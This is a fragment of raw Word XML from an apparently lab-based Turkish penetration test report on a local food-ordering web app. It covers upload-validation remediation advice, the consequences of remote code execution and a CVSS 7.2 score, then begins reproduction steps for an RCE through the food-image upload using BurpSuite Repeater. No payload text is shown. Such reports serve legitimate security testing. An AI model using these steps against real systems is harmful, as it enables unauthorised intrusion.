                          <a:blip r:embed="rId23"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5713730" cy="1145540"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E0B0FF8" w14:textId="763F1F5A" w:rsidR="00AD7526" w:rsidRPr="00CF0A67" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidR="005B76F9">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00CD5762" w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Elde </w:t>
            </w:r>
            <w:r w:rsidR="00CD5762">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Edilen Komutun Response’u</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AD7526" w:rsidRPr="00057867" w14:paraId="19E8F420" w14:textId="77777777" w:rsidTr="005C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1B86B560" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00057867" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AD7526" w:rsidRPr="00D60321" w14:paraId="0F4554DA" w14:textId="77777777" w:rsidTr="005C66ED">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="18EA37B5" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00BF4DE0" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t xml:space="preserve">  Dosya Türü Kontrolü:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C67EA8D" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00BF4DE0" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="11"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklemeye izin verilen dosya türlerini sınırlayın. Sadece belirli dosya türlerine (örneğin, .jpg, .png, .pdf) izin verin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="699E0E38" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00BF4DE0" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="11"/>
              </w:numPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Dosya uzantılarını kontrol etmek yeterli değildir; dosya içeriğini de doğrulamak için MIME türü kontrolü yapın</w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F9462DE" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00BF4DE0" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t xml:space="preserve"> Dosya Boyutu Sınırlaması:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AA1C766" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00BF4DE0" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="12"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklenen dosyaların boyutunu sınırlayın. Belirli bir boyutun üzerinde dosya yüklemeyi engelleyin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B6B6B80" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00BF4DE0" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t>Dosya İsimleri Kontrolü:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0307C001" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00BF4DE0" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklenen dosyaların isimlerini güvenli hale getirin. Dosya isimlerindeki özel karakterleri temizleyin ve dosya isimlerini standart bir formatta düzenleyin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B5DAA2C" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00BF4DE0" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Aynı dosya ismi ile yüklenmeleri durumunda yeni isimler verin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33564296" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00402B96" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AD7526" w14:paraId="126CCB1A" w14:textId="77777777" w:rsidTr="005C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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71D4F94C" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AD7526" w14:paraId="57F69534" w14:textId="77777777" w:rsidTr="005C66ED">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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="72B86CE6" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="15"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Tam Kontrol: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde tam kontrol sağlayabilir. Bu, dosya sistemine erişim, sistem ayarlarını değiştirme ve yazılımları yükleme veya kaldırma anlamına gelir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2836A632" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5392A2B5" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Veri Hırsızlığı: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>RCE zafiyeti sayesinde, saldırgan hassas verilere (şifreler, kişisel bilgiler, finansal veriler vb.) erişebilir ve bunları çalabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B78CBBA" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="242C6D79" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Zarar Verme: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde kötü amaçlı yazılımlar, virüsler veya truva atları yükleyerek sistemin işleyişini bozabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="577078B2" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="10D33848" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Ağ İçin Tehdit: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Hedef sistemin yanı sıra, RCE zafiyetleri, diğer bağlı sistemlere (ağdaki diğer cihazlar, sunucular vb.) de zarar verebilir veya erişim sağlayabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1222E00D" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5EFA078C" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="390061DF" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Veri Bütünlüğünün İhlali:</w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Saldırgan, verileri değiştirebilir veya silebilir, bu da veri bütünlüğünü ciddi şekilde etkileyebilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EB783F2" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="414DD63F" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Hizmet Durdurma: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, sistem kaynaklarını aşırı şekilde kullanarak hedef sistemin hizmet dışı kalmasına neden olabilir (DoS/DDoS saldırıları).</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="622107FA" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="283BDA8A" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00991F03" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Sistem İzleme: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde gizlice izleme yaparak kullanıcıların etkinliklerini gözlemleyebilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B3B9602" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AD7526" w:rsidRPr="00402B96" w14:paraId="4CC70423" w14:textId="77777777" w:rsidTr="005C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29C6DADC" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AD7526" w:rsidRPr="00402B96" w14:paraId="50BA896F" w14:textId="77777777" w:rsidTr="005C66ED">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="09F680DE" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00C361DB" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>7.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AD7526" w:rsidRPr="00402B96" w14:paraId="24560ABE" w14:textId="77777777" w:rsidTr="005C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1F37376D" w14:textId="0A18639A" w:rsidR="00AD7526" w:rsidRPr="00402B96" w:rsidRDefault="00D27DB4" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="64982F28" w14:textId="03D23186" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00B24C32">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>4 ) Remote Code Execution</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E6D77" w14:paraId="306FB9D0" w14:textId="77777777" w:rsidTr="00C20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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C583ED9" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Zafiyet Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w14:paraId="0C817A77" w14:textId="77777777" w:rsidTr="00C20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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="49383621" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Remote Code Execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w14:paraId="6CCDFC0D" w14:textId="77777777" w:rsidTr="00C20FA7">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5E43DEFA" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00057867" w14:paraId="05AE633F" w14:textId="77777777" w:rsidTr="00C20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354B79C2" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B8AC4D8" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00057867" w14:paraId="0B5C59AD" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="0E221406" w14:textId="22C2B0B6" w:rsidR="004E6D77" w:rsidRPr="00EE6B0D" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId24" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> firma</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">  Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId25" w:history="1">
              <w:r w:rsidRPr="004E2517">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/company_edit_food.php?id=2</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir. Yemek resmi seçin butonuna tıklanır ve test.jpg dosyası sistemi yüklenir ve istek </w:t>
            </w:r>
            <w:r w:rsidRPr="0020446C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>BurpSuite proxy aracı ile yakalanır</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> ve isteğe sağ tıklanıp “send to repeater” seçeneği seçilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C66DD21" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="213E289C" w14:textId="7E85DFF8" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E6D77">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
